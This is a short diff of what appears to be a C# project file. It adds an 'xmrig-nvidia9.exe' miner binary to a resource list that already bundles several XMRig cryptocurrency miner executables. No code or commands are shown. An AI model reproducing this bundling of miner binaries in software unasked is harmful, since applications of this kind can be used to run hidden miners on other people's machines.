@@ -125,6 +125,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="Icon.ico" />
+    <None Include="Resources\xmrig-nvidia9.exe" />
     <None Include="Resources\xmrig.exe" />
     <None Include="Resources\xmrig-nvidia.exe" />
     <None Include="Resources\xmrig-amd-notls.exe" />
